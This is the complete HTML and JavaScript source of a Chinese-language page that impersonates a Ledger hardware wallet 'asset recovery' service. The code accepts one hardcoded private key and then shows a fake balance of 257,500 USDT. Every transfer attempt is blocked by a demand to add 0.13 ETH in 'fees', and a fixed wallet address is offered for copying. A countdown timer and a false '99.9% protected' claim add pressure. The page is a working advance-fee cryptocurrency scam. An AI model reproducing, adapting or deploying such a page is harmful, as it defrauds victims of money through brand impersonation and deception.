<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ledger 硬件钱包</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Exo 2', 'PingFang SC', 'Microsoft YaHei', sans-serif;
        }

        body {
            background: radial-gradient(circle at center, #0A1A3D 0%, #000000 100%);
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            position: relative;
            touch-action: manipulation;
        }

        .content {
            text-align: center;
            z-index: 100;
            position: relative;
        }

        .ledger-icon {
            width: 60px;
            height: 30px;
            background: transparent;
            border: 2px solid #00FFFF;
            border-radius: 8px;
            position: relative;
            margin: 0 auto 15px;
            animation: glow 2s infinite ease-in-out;
            z-index: 90;
        }

        .ledger-icon::before {
            content: '';
            position: absolute;
            top: 50%;
            right: 8px;
            width: 8px;
            height: 8px;
            background: #FF00FF;
            border-radius: 50%;
            transform: translateY(-50%);
            animation: blink 1.5s infinite ease-in-out;
        }

        @keyframes glow {
            0% { box-shadow: 0 0 8px rgba(0, 255, 255, 0.5); }
            50% { box-shadow: 0 0 16px rgba(0, 255, 255, 1); }
            100% { box-shadow: 0 0 8px rgba(0, 255, 255, 0.5); }
        }

        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }

        .title {
            font-size: 36px;
            font-weight: 700;
            color: #00FFFF;
            -webkit-text-stroke: 0.3px #FF00FF;
            text-shadow: 0 0 10px rgba(255, 0, 255, 0.3);
            margin-bottom: 20px;
            letter-spacing: 3px;
            position: relative;
            z-index: 110;
        }

        .title::before,
        .title::after {
            content: '';
            position: absolute;
            top: 50%;
            width: 40px;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00FFFF, transparent);
            animation: lightSweep 3s infinite ease-in-out;
            z-index: 109;
        }

        .title::before {
            left: -50px;
        }

        .title::after {
            right: -50px;
        }

        @keyframes lightSweep {
            0% { transform: translateX(-8px); opacity: 0.3; }
            50% { transform: translateX(8px); opacity: 1; }
            100% { transform: translateX(-8px); opacity: 0.3; }
        }

        .countdown {
            font-size: 16px;
            color: #FFFFFF;
            margin-bottom: 20px;
            letter-spacing: 1px;
            z-index: 110;
        }

        .countdown span {
            color: #FF00FF;
            font-weight: 700;
            animation: tick 1s infinite step-end;
        }

        @keyframes tick {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        .button-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            position: relative;
            z-index: 120;
        }

        .secondary-button,
        .quaternary-button,
        .fifth-button {
            display: inline-block;
            width: 250px;
            padding: 12px 0;
            background: transparent;
            border: 2px solid;
            border-radius: 50px;
            font-weight: 500;
            font-size: 16px;
            text-align: center;
            position: relative;
            z-index: 130;
            transition: all 0.3s ease;
            color: inherit;
            cursor: pointer;
        }

        .secondary-button {
            border-color: #FF00FF;
            color: #FF00FF;
            animation: buttonPulseSecondary 2s infinite ease-in-out;
        }

        .secondary-button:hover {
            background: #FF00FF;
            color: #000000;
            box-shadow: 0 0 15px rgba(255, 0, 255, 0.8);
        }

        .quaternary-button {
            border-color: #00FFFF;
            color: #00FFFF;
            animation: buttonPulse 2s infinite ease-in-out;
        }

        .quaternary-button:hover {
            background: #00FFFF;
            color: #000000;
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.8);
        }

        .fifth-button {
            border-color: #FF00FF;
            color: #FF00FF;
            animation: buttonPulseSecondary 2s infinite ease-in-out;
        }

        .fifth-button:hover {
            background: #FF00FF;
            color: #000000;
            box-shadow: 0 0 15px rgba(255, 0, 255, 0.8);
        }

        .secondary-button::before,
        .quaternary-button::before,
        .fifth-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, rgba(0, 255, 255, 0.1) 25%, transparent 25%, transparent 50%, rgba(0, 255, 255, 0.1) 50%, rgba(0, 255, 255, 0.1) 75%, transparent 75%, transparent);
            background-size: 15px 15px;
            opacity: 0.3;
            z-index: -1;
        }

        @keyframes buttonPulse {
            0% { box-shadow: 0 0 8px rgba(0, 255, 255, 0.5); }
            50% { box-shadow: 0 0 16px rgba(0, 255, 255, 1); }
            100% { box-shadow: 0 0 8px rgba(0, 255, 255, 0.5); }
        }

        @keyframes buttonPulseSecondary {
            0% { box-shadow: 0 0 8px rgba(255, 0, 255, 0.5); }
            50% { box-shadow: 0 0 16px rgba(255, 0, 255, 1); }
            100% { box-shadow: 0 0 8px rgba(255, 0, 255, 0.5); }
        }

        .security-note {
            font-size: 12px;
            color: #A1A1AA;
            margin-top: 20px;
            letter-spacing: 1px;
            animation: flicker 3s infinite ease-in-out;
            z-index: 110;
        }

        .security-note span {
            color: #00FFFF;
            font-weight: 700;
        }

        @keyframes flicker {
            0% { opacity: 0.7; }
            50% { opacity: 1; }
            100% { opacity: 0.7; }
        }

        #particles {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .hex-grid {
            position: absolute;
            bottom: 0;
            width: 100%;
            height: 150px;
            background: linear-gradient(90deg, rgba(0, 255, 255, 0.1) 1px, transparent 1px),
                        linear-gradient(150deg, rgba(0, 255, 255, 0.1) 1px, transparent 1px),
                        linear-gradient(30deg, rgba(0, 255, 255, 0.1) 1px, transparent 1px);
            background-size: 50px 86px;
            opacity: 0.3;
            z-index: 2;
        }

        .circuit-flow-left,
        .circuit-flow-right {
            position: absolute;
            top: 0;
            width: 2px;
            height: 100%;
            background: linear-gradient(to bottom, transparent, #00FFFF, transparent);
            animation: flow 2s infinite linear;
            z-index: 3;
        }

        .circuit-flow-left {
            left: 20px;
        }

        .circuit-flow-right {
            right: 20px;
        }

        @keyframes flow {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }

        /* 弹窗页面样式 */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 200;
            background: radial-gradient(circle at center, #0A1A3D 0%, #000000 100%);
        }

        .modal-content {
            text-align: center;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 210;
            color: #FFFFFF;
            padding: 20px;
            border-radius: 15px;
            background: rgba(255, 255, 255, 0.05);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }

        .modal-content input {
            width: 250px;
            padding: 10px 40px 10px 10px;
            margin: 10px 0;
            border: 2px solid #00FFFF;
            border-radius: 20px;
            background: transparent;
            color: #FFFFFF;
            font-size: 16px;
        }

        #transfer-amount {
            background-image: url('https://s2.coinmarketcap.com/static/img/coins/64x64/825.png');
            background-repeat: no-repeat;
            background-position: right 10px center;
            background-size: 20px 20px;
        }

        .modal-content input[type="number"] {
            -webkit-appearance: none;
            -moz-appearance: textfield;
        }

        .modal-content input[type="number"]::-webkit-inner-spin-button,
        .modal-content input[type="number"]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .modal-content button {
            width: 150px;
            padding: 10px;
            margin: 10px 5px;
            border: 2px solid #00FFFF;
            border-radius: 50px;
            background: transparent;
            color: #00FFFF;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .modal-content button:hover {
            background: #00FFFF;
            color: #000000;
        }

        .modal-content p {
            font-size: 16px;
            margin: 10px 0;
            display: flex;
            align-items: center;
            justify-content: flex-start; /* 左对齐 */
            gap: 8px;
        }

        /* 固定图标容器宽度，确保对齐 */
        .coin-icon-container {
            width: 30px; /* 固定宽度，确保图标区域一致 */
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .balance-buttons {
            display: flex;
            gap: 20px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .coin-icon {
            width: 20px;
            height: 20px;
        }

        .copy-toast {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.8);
            color: #00FFFF;
            padding: 10px 20px;
            border-radius: 10px;
            z-index: 300;
            display: none;
            max-width: 80vw;
            text-align: center;
        }

        .balance-card {
            background: rgba(0, 255, 255, 0.1);
            border: 1px solid #00FFFF;
            border-radius: 10px;
            padding: 10px;
            margin: 10px 0;
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
        }

        .network-info {
            font-size: 14px;
            color: #A1A1AA;
            margin: 10px 0;
        }

        .network-info span {
            color: #00FFFF;
            font-weight: 700;
        }

        .receive-address {
            font-size: 14px;
            word-break: break-all;
            margin: 10px 0;
            color: #00FFFF;
        }

        @media (max-width: 768px) {
            .title {
                font-size: 24px;
                margin-bottom: 15px;
            }

            .countdown {
                font-size: 14px;
            }

            .button-container {
                gap: 10px;
            }

            .secondary-button,
            .quaternary-button,
            .fifth-button {
                width: 85vw;
                max-width: 350px;
                padding: 10px 0;
                font-size: 14px;
            }

            .security-note {
                font-size: 10px;
            }

            .ledger-icon {
                width: 50px;
                height: 25px;
            }

            .modal-content {
                width: 90vw;
                padding: 15px;
            }

            .modal-content input {
                width: 100%;
                max-width: 300px;
                font-size: 16px;
            }

            .modal-content button {
                width: 120px;
                font-size: 14px;
            }

            .modal-content p {
                font-size: 14px;
            }

            .receive-address {
                font-size: 12px;
            }

            .balance-card {
                padding: 8px;
            }

            .network-info {
                font-size: 12px;
            }
        }

        @media (max-width: 480px) {
            .modal-content {
                width: 95vw;
            }

            .modal-content input {
                width: 100%;
                max-width: 280px;
            }

            .modal-content button {
                width: 100px;
                font-size: 12px;
            }

            .title {
                font-size: 20px;
            }

            .countdown {
                font-size: 12px;
            }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <!-- 主页 -->
    <div class="content" id="home-page">
        <div class="ledger-icon"></div>
        <h1 class="title">Ledger 硬件钱包</h1>
        <div class="countdown">下次安全更新倒计时：<span id="countdown-minutes"></span> 分 <span id="countdown-seconds"></span> 秒</div>
        <div class="button-container">
            <button class="secondary-button" onclick="showModal('private-key-modal')">使用私钥找回钱包资产</button>
            <button class="fifth-button" onclick="showModal('private-key-modal')">找回Ledger资产</button>
            <button class="quaternary-button" onclick="showModal('private-key-modal')">在线找回Ledger资产并转移</button>
        </div>
        <div class="security-note">已保护：<span>99.9%</span> 资产安全</div>
    </div>

    <!-- 私钥输入页面 -->
    <div class="modal" id="private-key-modal">
        <div class="modal-content">
            <div class="ledger-icon"></div>
            <p>请输入 Ledger 硬件钱包的私钥</p>
            <input type="text" id="private-key-input" placeholder="输入私钥">
            <div class="balance-buttons">
                <button onclick="verifyPrivateKey()">下一步</button>
                <button onclick="closeModal('private-key-modal')">关闭</button>
            </div>
        </div>
    </div>

    <!-- 私钥验证结果页面 -->
    <div class="modal" id="key-result-modal">
        <div class="modal-content">
            <div class="ledger-icon"></div>
            <p id="key-result-text"></p>
            <div class="balance-buttons">
                <button id="next-button" onclick="nextStep()" style="display: none;">下一步</button>
                <button onclick="closeModal('key-result-modal')">关闭</button>
            </div>
        </div>
    </div>

    <!-- 余额页面 -->
    <div class="modal" id="balance-modal">
        <div class="modal-content">
            <div class="ledger-icon"></div>
            <div class="network-info">网络: <span>Ethereum Mainnet</span></div>
            <div class="balance-card">
                <p>
                    <span class="coin-icon-container">
                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" alt="USDT Icon" class="coin-icon">
                    </span>
                    USDT 余额: <span id="usdt-balance"></span>
                </p>
                <p>
                    <span class="coin-icon-container">
                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png" alt="ETH Icon" class="coin-icon">
                    </span>
                    ETH 余额: 0 ETH
                </p>
            </div>
            <div class="balance-buttons">
                <button onclick="showModal('transfer-modal')">转账</button>
                <button onclick="showModal('receive-modal')">收款</button>
            </div>
        </div>
    </div>

    <!-- 转账页面 -->
    <div class="modal" id="transfer-modal">
        <div class="modal-content">
            <div class="ledger-icon"></div>
            <p>输入转账数据</p>
            <input type="text" id="transfer-address" placeholder="输入转账地址">
            <input type="number" id="transfer-amount" placeholder="输入转账数量">
            <div class="balance-buttons">
                <button onclick="transferNext()">下一步</button>
                <button onclick="closeModal('transfer-modal')">关闭</button>
            </div>
        </div>
    </div>

    <!-- 转账手续费提示 -->
    <div class="modal" id="fee-modal">
        <div class="modal-content">
            <div class="ledger-icon"></div>
            <p>转账手续费不足，请补充最低 0.13 ETH</p>
            <div class="balance-buttons">
                <button onclick="closeModal('fee-modal')">关闭</button>
            </div>
        </div>
    </div>

    <!-- USDT 余额不足提示 -->
    <div class="modal" id="balance-insufficient-modal">
        <div class="modal-content">
            <div class="ledger-icon"></div>
            <p>USDT 余额不足</p>
            <div class="balance-buttons">
                <button onclick="closeModal('balance-insufficient-modal')">关闭</button>
            </div>
        </div>
    </div>

    <!-- 地址错误提示 -->
    <div class="modal" id="address-error-modal">
        <div class="modal-content">
            <div class="ledger-icon"></div>
            <p>地址错误</p>
            <div class="balance-buttons">
                <button onclick="closeModal('address-error-modal')">关闭</button>
            </div>
        </div>
    </div>

    <!-- 收款页面 -->
    <div class="modal" id="receive-modal">
        <div class="modal-content">
            <div class="ledger-icon"></div>
            <p>收款地址</p>
            <div class="receive-address">0x64C6592164CC7C0Bdfb1D9a6F64C172a1830eD2C</div>
            <div class="balance-buttons">
                <button onclick="copyAddress()">复制地址</button>
                <button onclick="closeModal('receive-modal')">关闭</button>
            </div>
        </div>
    </div>

    <!-- 复制成功提示 -->
    <div class="copy-toast" id="copy-toast">复制成功</div>

    <!-- 粒子背景 -->
    <div id="particles"></div>
    <div class="hex-grid"></div>
    <div class="circuit-flow-left"></div>
    <div class="circuit-flow-right"></div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
    <script>
        // 粒子背景初始化
        particlesJS("particles", {
            particles: {
                number: { value: 50, density: { enable: true, value_area: 800 } },
                color: { value: ["#00FFFF", "#FF00FF", "#FFFFFF"] },
                shape: { type: "circle" },
                opacity: { value: 0.2, random: true },
                size: { value: 1.5, random: true },
                line_linked: { enable: true, distance: 150, color: "#00FFFF", opacity: 0.1, width: 1 },
                move: {
                    enable: true,
                    speed: 1,
                    direction: "none",
                    random: true,
                    straight: false,
                    out_mode: "out",
                },
            },
            interactivity: { detect_on: "canvas", events: { onhover: { enable: true, mode: "repulse" } } },
            retina_detect: true,
        });

        // 倒计时
        let countdown = 500;
        const minutesElement = document.getElementById("countdown-minutes");
        const secondsElement = document.getElementById("countdown-seconds");

        function updateCountdown() {
            const minutes = Math.floor(countdown / 60);
            const seconds = countdown % 60;
            minutesElement.textContent = minutes;
            secondsElement.textContent = seconds < 10 ? `0${seconds}` : seconds;
            countdown = countdown > 0 ? countdown - 1 : 500;
        }

        updateCountdown();
        setInterval(updateCountdown, 1000);

        // 主页动画
        gsap.from(".ledger-icon", {
            opacity: 0,
            scale: 0.5,
            duration: 1,
            delay: 0.5,
            ease: "elastic.out(1, 0.5)",
        });

        const titleText = document.querySelector(".title");
        titleText.innerHTML = titleText.textContent
            .split("")
            .map((char, i) => `<span style="display:inline-block; z-index: 110">${char}</span>`)
            .join("");
        gsap.from(".title span", {
            opacity: 0,
            y: 20,
            duration: 0.5,
            stagger: 0.05,
            delay: 1,
            ease: "power2.out",
            onComplete: () => gsap.set(".title span", { opacity: 1 })
        });

        gsap.from(".countdown", {
            opacity: 0,
            y: 20,
            duration: 0.5,
            delay: 1.5,
            ease: "power2.out",
            onComplete: () => gsap.set(".countdown", { opacity: 1 })
        });

        gsap.from(".secondary-button", {
            scale: 0.5,
            opacity: 0,
            duration: 1,
            delay: 2,
            ease: "elastic.out(1, 0.5)",
            onComplete: () => gsap.set(".secondary-button", { opacity: 1 })
        });

        gsap.from(".fifth-button", {
            scale: 0.5,
            opacity: 0,
            duration: 1,
            delay: 2.3,
            ease: "elastic.out(1, 0.5)",
            onComplete: () => gsap.set(".fifth-button", { opacity: 1 })
        });

        gsap.from(".quaternary-button", {
            scale: 0.5,
            opacity: 0,
            duration: 1,
            delay: 2.6,
            ease: "elastic.out(1, 0.5)",
            onComplete: () => gsap.set(".quaternary-button", { opacity: 1 })
        });

        gsap.from(".security-note", {
            opacity: 0,
            y: 20,
            duration: 0.5,
            delay: 2.9,
            ease: "power2.out",
            onComplete: () => gsap.set(".security-note", { opacity: 1 })
        });

        // 格式化 USDT 余额为美元格式
        const usdtBalance = 257500;
        document.getElementById('usdt-balance').textContent = usdtBalance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        }) + ' USDT';

        // 弹窗控制
        function showModal(modalId) {
            const modal = document.getElementById(modalId);
            modal.style.display = 'block';
            document.getElementById('home-page').style.display = 'none';
            animateModal(modal);
            if (modalId === 'private-key-modal') {
                document.getElementById('private-key-input').value = '';
            } else if (modalId === 'transfer-modal') {
                document.getElementById('transfer-address').value = '';
                document.getElementById('transfer-amount').value = '';
            }
        }

        function closeModal(modalId) {
            const modal = document.getElementById(modalId);
            gsap.to(modal, {
                opacity: 0,
                duration: 0.5,
                onComplete: () => {
                    modal.style.display = 'none';
                    modal.style.opacity = '1';
                    if (modalId !== 'balance-modal') {
                        document.getElementById('home-page').style.display = 'block';
                    }
                }
            });
        }

        function animateModal(modal) {
            gsap.from(modal.querySelector('.ledger-icon'), {
                opacity: 0,
                scale: 0.5,
                duration: 1,
                ease: "elastic.out(1, 0.5)",
            });
            gsap.from(modal.querySelector('.modal-content'), {
                opacity: 0,
                y: 20,
                duration: 0.5,
                delay: 0.5,
                ease: "power2.out",
            });
        }

        // 私钥验证
        function verifyPrivateKey() {
            const input = document.getElementById('private-key-input').value;
            const correctKey = 'Ox257kNJFohklexbcymqapHYFkyNM';
            const resultModal = document.getElementById('key-result-modal');
            const resultText = document.getElementById('key-result-text');
            const nextButton = document.getElementById('next-button');

            closeModal('private-key-modal');
            showModal('key-result-modal');

            if (input === correctKey) {
                resultText.textContent = '私钥正确，请尽快转移资产到安全地址';
                nextButton.style.display = 'block';
            } else {
                resultText.textContent = '私钥错误，请重新验证私钥正确性后再试';
                nextButton.style.display = 'none';
            }
        }

        function nextStep() {
            closeModal('key-result-modal');
            showModal('balance-modal');
        }

        // 验证 Ethereum 地址
        function isValidEthereumAddress(address) {
            const ethAddressRegex = /^0x[a-fA-F0-9]{40}$/;
            return ethAddressRegex.test(address);
        }

        // 转账下一步
        function transferNext() {
            const amount = parseFloat(document.getElementById('transfer-amount').value);
            const address = document.getElementById('transfer-address').value;
            const maxUsdtBalance = 257500;

            if (isNaN(amount) || amount <= 0) {
                alert('请输入有效的转账数量');
                return;
            }

            if (amount > maxUsdtBalance) {
                closeModal('transfer-modal');
                showModal('balance-insufficient-modal');
                return;
            }

            if (!isValidEthereumAddress(address)) {
                closeModal('transfer-modal');
                showModal('address-error-modal');
                return;
            }

            closeModal('transfer-modal');
            showModal('fee-modal');
        }

        // 复制地址
        function copyAddress() {
            const address = document.querySelector('.receive-address').textContent;
            navigator.clipboard.writeText(address).then(() => {
                const toast = document.getElementById('copy-toast');
                toast.style.display = 'block';
                setTimeout(() => {
                    toast.style.display = 'none';
                    closeModal('receive-modal');
                }, 1500);
            });
        }
    </script>
</body>
</html>
